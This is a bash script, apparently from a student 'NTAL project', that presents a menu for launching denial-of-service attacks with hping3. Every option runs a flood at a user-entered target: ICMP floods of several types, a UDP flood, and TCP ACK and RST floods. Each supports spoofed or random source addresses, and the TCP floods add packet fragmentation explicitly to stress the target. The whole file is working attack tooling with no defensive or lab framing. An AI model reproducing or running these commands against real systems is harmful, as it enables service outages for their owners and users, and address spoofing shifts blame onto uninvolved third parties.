#!/bin/bash
PS3="GG>"

mainmenu()
{
dosmenu
}

##DOS##
#################
##START DOSMENU##
dosmenu()
{
#display a menu for the DOS module using bash select
		dosmenu=("ICMP Echo Flood" "UDP Flood" "TCP ACK Flood" "TCP RST Flood" "Go back")
	select dosopt in "${dosmenu[@]}"; do
#ICMP Echo Flood
	if [ "$dosopt" = "ICMP Echo Flood" ]; then
		icmpflood
#UDP Flood
	elif [ "$dosopt" = "UDP Flood" ]; then
		udpflood
#TCP ACK Flood
	elif [ "$dosopt" = "TCP ACK Flood" ]; then
		ackflood
#TCP RST Flood
	elif [ "$dosopt" = "TCP RST Flood" ]; then
		rstflood
#Go back
	elif [ "$dosopt" = "Go back" ]; then
		exit 0
	else
#Default if no valid menu option selected is to return an error
  	echo  "That's not a valid option! Hit Return to show menu"
	fi
done

}

##END DOSMENU##
###############

###################
##START ICMPFLOOD##
icmpflood()
{

dosmenu=("Echo Reply" "Destination Unreachable" "Source Quench" "Router advertisement" "Traceroute" "Go back")
	select dosopt in "${dosmenu[@]}"; do
#ICMP Echo Reply
	if [ "$dosopt" = "Echo Reply" ]; then
		echoreply
#ICMP Destination Unreachable
	elif [ "$dosopt" = "Destination Unreachable" ]; then
		destinationunreachable
#ICMP Source Quench
 	elif [ "$dosopt" = "Source Quench" ]; then
		sourcequench
#ICMP Router advertisement
	elif [ "$dosopt" = "Router advertisement" ]; then
  routeradvertisement
#ICMP Traceroute
	elif [ "$dosopt" = "Traceroute" ]; then
		traceroute
#Go back
	elif [ "$dosopt" = "Go back" ]; then
		exit 1
	else
#Default if no valid menu option selected is to return an error
  	echo  "That's not a valid option! Hit Return to show menu"
	fi
done
}
##END ICMPFLOOD##
#################	

#####################
##START TCPRSTFLOOD##
rstflood()
{		
	echo "Enter target:"
#need a target IP/hostname
	read -i $TARGET -e TARGET
#need a port to send TCP RST packets to
		echo "Enter target port (defaults to 80):"
	read -i $PORT -e PORT
	: ${PORT:=80}
#check a valid integer is given for the port, anything else is invalid
	if ! [[ "$PORT" =~ ^[0-9]+$ ]]; then
PORT=80 && echo "Invalid port, reverting to port 80"
	elif [ "$PORT" -lt "1" ]; then
PORT=80 && echo "Invalid port number chosen! Reverting port 80"
	elif [ "$PORT" -gt "65535" ]; then
PORT=80 && echo "Invalid port chosen! Reverting to port 80"
	else echo "Using Port $PORT"
	fi
#What source address to use? Manually defined, or random, or outgoing interface IP?
		echo "Enter Source IP, or [r]andom or [i]nterface IP (default):"
	read -i $SOURCE -e SOURCE
	: ${SOURCE:=i}
#should any data be sent with the RST packet?  Default is to send no data
	echo "Send data with RST packet? [y]es or [n]o (default)"
	read -i $SENDDATA -e SENDDATA
	: ${SENDDATA:=n}
	if [[ $SENDDATA = y ]]; then
#we've chosen to send data, so how much should we send?
	echo "Enter number of data bytes to send (default 3000):"
	read -i $DATA -e DATA
	: ${DATA:=3000}
#If not an integer is entered, use default
	if ! [[ "$DATA" =~ ^[0-9]+$ ]]; then
	DATA=3000 && echo "Invalid integer!  Using data length of 3000 bytes"
	fi
#if $SENDDATA is not equal to y (yes) then send no data
	else DATA=0
	fi
#start TCP RST flood using values defined earlier
#note that virtual fragmentation is set.  The default for hping3 is 16 bytes.
#fragmentation should therefore place more stress on the target system
	if [[ "$SOURCE" =~ ^([0-9]{1,3})[.]([0-9]{1,3})[.]([0-9]{1,3})[.]([0-9]{1,3})$ ]]; then
		echo "Starting TCP RST Flood. Use 'Ctrl c' to end and return to menu"
		sudo hping3 --flood -d $DATA --frag --spoof $SOURCE -p $PORT -R $TARGET
	elif [ "$SOURCE" = "r" ]; then
		echo "Starting TCP RST Flood. Use 'Ctrl c' to end and return to menu"
		sudo hping3 --flood -d $DATA --frag --rand-source -p $PORT -R $TARGET
	elif [ "$SOURCE" = "i" ]; then
		echo "Starting TCP RST Flood. Use 'Ctrl c' to end and return to menu"
		sudo hping3 -d $DATA --flood --frag -p $PORT -R $TARGET
	else echo "Not a valid option!  Using interface IP"
		echo "Starting TCP RST Flood. Use 'Ctrl c' to end and return to menu"
		sudo hping3 --flood -d $DATA --frag -p $PORT -R $TARGET
	fi
}
##END TCPRSTFLOOD##
###################

#################
##ECHO REPLY#####
echoreply()
{		
		echo "Preparing to launch ICMP Echo Reply"
		echo "Enter target IP/hostname:"
#need a target IP/hostname
		read -i $TARGET -e TARGET
#What source address to use? Manually defined, or random, or outgoing interface IP?
		echo "Enter Source IP, or [r]andom or [i]nterface IP (default):"
	read -i $SOURCE -e SOURCE
	: ${SOURCE:=i}
	if [[ "$SOURCE" =~ ^([0-9]{1,3})[.]([0-9]{1,3})[.]([0-9]{1,3})[.]([0-9]{1,3})$ ]]; then
		echo "Starting ICMP Echo Reply. Use 'Ctrl c' to end and return to menu"
		sudo hping3 -1 -C 3 -K 0 --flood --spoof $SOURCE $TARGET
	elif [ "$SOURCE" = "r" ]; then
		echo "Starting ICMP Echo Reply. Use 'Ctrl c' to end and return to menu"
		sudo hping3 -1 -C 3 -K 0 --flood --rand-source $TARGET
	elif [ "$SOURCE" = "i" ]; then
		echo "Starting ICMP Echo Reply. Use 'Ctrl c' to end and return to menu"
		sudo hping3 -1 -C 3 -K 0 --flood $TARGET
	else echo "Not a valid option!  Using interface IP"
		echo "Starting ICMP Echo Reply. Use 'Ctrl c' to end and return to menu"
		sudo hping3 -1 -C 3 -K 0 --flood $TARGET
	fi
}
##END ECHO REPLY##
##################


###################################
##DESTINATION UNREACHABLE##########
destinationunreachable()
{		
		echo "Preparing to launch ICMP Destination Unreacheable"
		echo "Enter target IP/hostname:"
#need a target IP/hostname
		read -i $TARGET -e TARGET
#What source address to use? Manually defined, or random, or outgoing interface IP?
		echo "Enter Source IP, or [r]andom or [i]nterface IP (default):"
	read -i $SOURCE -e SOURCE
	: ${SOURCE:=i}
	if [[ "$SOURCE" =~ ^([0-9]{1,3})[.]([0-9]{1,3})[.]([0-9]{1,3})[.]([0-9]{1,3})$ ]]; then
		echo "Starting ICMP Destination Unreacheable. Use 'Ctrl c' to end and return to menu"
		sudo hping3 -1 -C 3 -K 3 --flood --spoof $SOURCE $TARGET
	elif [ "$SOURCE" = "r" ]; then
		echo "Starting ICMP Destination Unreacheable. Use 'Ctrl c' to end and return to menu"
		sudo hping3 -1 -C 3 -K 3 --flood --rand-source $TARGET
	elif [ "$SOURCE" = "i" ]; then
		echo "Starting ICMP Destination Unreacheable. Use 'Ctrl c' to end and return to menu"
		sudo hping3 -1 -C 3 -K 3 --flood $TARGET
	else echo "Not a valid option!  Using interface IP"
		echo "Starting ICMP Destination Unreacheable. Use 'Ctrl c' to end and return to menu"
		sudo hping3 -1 -C 3 -K 3 --flood $TARGET
	fi
}
##END ICMP DESTINATION UNREACHABLE##
####################################


#########################
##SOURCE QUENCH##########
sourcequench()
{		
		echo "Preparing to launch ICMP Source Quench"
		echo "Enter target IP/hostname:"
#need a target IP/hostname
		read -i $TARGET -e TARGET
#What source address to use? Manually defined, or random, or outgoing interface IP?
		echo "Enter Source IP, or [r]andom or [i]nterface IP (default):"
	read -i $SOURCE -e SOURCE
	: ${SOURCE:=i}
	if [[ "$SOURCE" =~ ^([0-9]{1,3})[.]([0-9]{1,3})[.]([0-9]{1,3})[.]([0-9]{1,3})$ ]]; then
		echo "Starting ICMP Source Quench. Use 'Ctrl c' to end and return to menu"
		sudo hping3 -1 -C 3 -K 4 --flood --spoof $SOURCE $TARGET
	elif [ "$SOURCE" = "r" ]; then
		echo "Starting ICMP Source Quench. Use 'Ctrl c' to end and return to menu"
		sudo hping3 -1 -C 3 -K 4 --flood --rand-source $TARGET
	elif [ "$SOURCE" = "i" ]; then
		echo "Starting ICMP Source Quench. Use 'Ctrl c' to end and return to menu"
		sudo hping3 -1 -C 3 -K 4 --flood $TARGET
	else echo "Not a valid option!  Using interface IP"
		echo "Starting ICMP Source Quench. Use 'Ctrl c' to end and return to menu"
		sudo hping3 -1 -C 3 -K 4 --flood $TARGET
	fi
}
##END SOURCE QUENCH##
#####################

#########################
##ROUTER ADVERTISEMENT##########
routeradvertisement()
{		
		echo "Preparing to launch ICMP Router Advertisement"
		echo "Enter target IP/hostname:"
#need a target IP/hostname
		read -i $TARGET -e TARGET
#What source address to use? Manually defined, or random, or outgoing interface IP?
		echo "Enter Source IP, or [r]andom or [i]nterface IP (default):"
	read -i $SOURCE -e SOURCE
	: ${SOURCE:=i}
	if [[ "$SOURCE" =~ ^([0-9]{1,3})[.]([0-9]{1,3})[.]([0-9]{1,3})[.]([0-9]{1,3})$ ]]; then
		echo "Starting ICMP Router Advertisement. Use 'Ctrl c' to end and return to menu"
		sudo hping3 -1 -C 3 -K 9 --flood --spoof $SOURCE $TARGET
	elif [ "$SOURCE" = "r" ]; then
		echo "Starting ICMP Router Advertisement. Use 'Ctrl c' to end and return to menu"
		sudo hping3 -1 -C 3 -K 9 --flood --rand-source $TARGET
	elif [ "$SOURCE" = "i" ]; then
		echo "Starting ICMP SRouter Advertisement. Use 'Ctrl c' to end and return to menu"
		sudo hping3 -1 -C 3 -K 9 --flood $TARGET
	else echo "Not a valid option!  Using interface IP"
		echo "Starting ICMP Router Advertisement. Use 'Ctrl c' to end and return to menu"
		sudo hping3 -1 -C 3 -K 9 --flood $TARGET
	fi
}
##END ROUTER ADVERTISEMENT##
#####################

#########################
##TRACEROUTE##########
traceroute()
{		
		echo "Preparing to launch ICMP Traceroute"
		echo "Enter target IP/hostname:"
#need a target IP/hostname
		read -i $TARGET -e TARGET
#What source address to use? Manually defined, or random, or outgoing interface IP?
		echo "Enter Source IP, or [r]andom or [i]nterface IP (default):"
	read -i $SOURCE -e SOURCE
	: ${SOURCE:=i}
	if [[ "$SOURCE" =~ ^([0-9]{1,3})[.]([0-9]{1,3})[.]([0-9]{1,3})[.]([0-9]{1,3})$ ]]; then
		echo "Starting ICMP Traceroute. Use 'Ctrl c' to end and return to menu"
		sudo hping3 -1 -C 3 -K 30 --flood --spoof $SOURCE $TARGET
	elif [ "$SOURCE" = "r" ]; then
		echo "Starting ICMP STraceroute. Use 'Ctrl c' to end and return to menu"
		sudo hping3 -1 -C 3 -K 30 --flood --rand-source $TARGET
	elif [ "$SOURCE" = "i" ]; then
		echo "Starting ICMP Traceroute. Use 'Ctrl c' to end and return to menu"
		sudo hping3 -1 -C 3 -K 30 --flood $TARGET
	else echo "Not a valid option!  Using interface IP"
		echo "Starting ICMP Traceroute. Use 'Ctrl c' to end and return to menu"
		sudo hping3 -1 -C 3 -K 30 --flood $TARGET
	fi
}
##END TRACEROUTE##
#####################

##################
##START UDPFLOOD##
udpflood()
{
#need a valid target IP/hostname
	echo "Enter target:"
		read -i $TARGET -e TARGET
#need a valid target UDP port
	echo "Enter target port (defaults to 80):"
		read -i $PORT -e PORT
		: ${PORT:=80}
#check a valid integer is given for the port, anything else is invalid
	if ! [[ "$PORT" =~ ^[0-9]+$ ]]; then
PORT=80 && echo "Invalid port, reverting to port 80"
	elif [ "$PORT" -lt "1" ]; then
PORT=80 && echo "Invalid port number chosen! Reverting port 80"
	elif [ "$PORT" -gt "65535" ]; then
PORT=80 && echo "Invalid port chosen! Reverting to port 80"
	else echo "Using Port $PORT"
	fi
#what data should we send with each packet?
#curently only accepts stdin.  Can't define a file to read from
	echo "Enter random string (data to send):"
		read DATA
#what source IP should we write to sent packets?
	echo "Enter Source IP, or [r]andom or [i]nterface IP (default):"
		read -i $SOURCE -e SOURCE
	: ${SOURCE:=i}
#start the attack using values defined earlier
	if [[ "$SOURCE" =~ ^([0-9]{1,3})[.]([0-9]{1,3})[.]([0-9]{1,3})[.]([0-9]{1,3})$ ]]; then
		echo "Starting UDP Flood. Use 'Ctrl c' to end and return to menu"
		sudo hping3 --flood --spoof $SOURCE --udp --sign $DATA -p $PORT $TARGET
	elif [ "$SOURCE" = "r" ]; then
		echo "Starting UDP Flood. Use 'Ctrl c' to end and return to menu"
		sudo hping3 --flood --rand-source --udp --sign $DATA -p $PORT $TARGET
	elif [ "$SOURCE" = "i" ]; then
		echo "Starting UDP Flood. Use 'Ctrl c' to end and return to menu"
		sudo hping3 --flood --udp --sign $DATA -p $PORT $TARGET
#if no valid source option is selected, use outgoing interface IP
	else echo "Not a valid option!  Using interface IP"
		echo "Starting UDP Flood. Use 'Ctrl c' to end and return to menu"
		sudo hping3 --flood --udp --sign $DATA -p $PORT $TARGET
	fi
}
##END UDPFLOOD##
################

#####################
##START TCPACKFLOOD##
ackflood()
{		
		echo "Enter target:"
#need a target IP/hostname
	read -i $TARGET -e TARGET
#need a port to send TCP ACK packets to
		echo "Enter target port (defaults to 80):"
	read -i $PORT -e PORT
	: ${PORT:=80}
#check a valid integer is given for the port, anything else is invalid
	if ! [[ "$PORT" =~ ^[0-9]+$ ]]; then
PORT=80 && echo "Invalid port, reverting to port 80"
	elif [ "$PORT" -lt "1" ]; then
PORT=80 && echo "Invalid port number chosen! Reverting port 80"
	elif [ "$PORT" -gt "65535" ]; then
PORT=80 && echo "Invalid port chosen! Reverting to port 80"
	else echo "Using Port $PORT"
	fi
#What source address to use? Manually defined, or random, or outgoing interface IP?
		echo "Enter Source IP, or [r]andom or [i]nterface IP (default):"
	read -i $SOURCE -e SOURCE
	: ${SOURCE:=i}
#should any data be sent with the ACK packet?  Default is to send no data
	echo "Send data with ACK packet? [y]es or [n]o (default)"
	read -i $SENDDATA -e SENDDATA
	: ${SENDDATA:=n}
	if [[ $SENDDATA = y ]]; then
#we've chosen to send data, so how much should we send?
	echo "Enter number of data bytes to send (default 3000):"
	read -i $DATA -e DATA
	: ${DATA:=3000}
#If not an integer is entered, use default
	if ! [[ "$DATA" =~ ^[0-9]+$ ]]; then
	DATA=3000 && echo "Invalid integer!  Using data length of 3000 bytes"
	fi
#if $SENDDATA is not equal to y (yes) then send no data
	else DATA=0
	fi
#start TCP ACK flood using values defined earlier
#note that virtual fragmentation is set.  The default for hping3 is 16 bytes.
#fragmentation should therefore place more stress on the target system
	if [[ "$SOURCE" =~ ^([0-9]{1,3})[.]([0-9]{1,3})[.]([0-9]{1,3})[.]([0-9]{1,3})$ ]]; then
		echo "Starting TCP ACK Flood. Use 'Ctrl c' to end and return to menu"
		sudo hping3 --flood -d $DATA --frag --spoof $SOURCE -p $PORT -A $TARGET
	elif [ "$SOURCE" = "r" ]; then
		echo "Starting TCP ACK Flood. Use 'Ctrl c' to end and return to menu"
		sudo hping3 --flood -d $DATA --frag --rand-source -p $PORT -A $TARGET
	elif [ "$SOURCE" = "i" ]; then
		echo "Starting TCP ACK Flood. Use 'Ctrl c' to end and return to menu"
		sudo hping3 -d $DATA --flood --frag -p $PORT -A $TARGET
	else echo "Not a valid option!  Using interface IP"
		echo "Starting TCP ACK Flood. Use 'Ctrl c' to end and return to menu"
		sudo hping3 --flood -d $DATA --frag -p $PORT -A $TARGET
	fi
}
##END TCPACKFLOOD##
###################



###############
##/GENERIC##


##WELCOME##
#########################
##START WELCOME MESSAGE##
#everything before this is a function and functions have to be defined before they can be used
#so the welcome message MUST be placed at the end of the script
	clear && echo ""

echo -e "\n"
#sudo apt-get install figlet
figlet -f standard "GG"
echo -e "\n"

echo "Welcome to our NTAL project!!"
echo "Choose the type of DOS attack to be performed"
mainmenu
##END WELCOME MESSAGE##
#######################
##/WELCOME##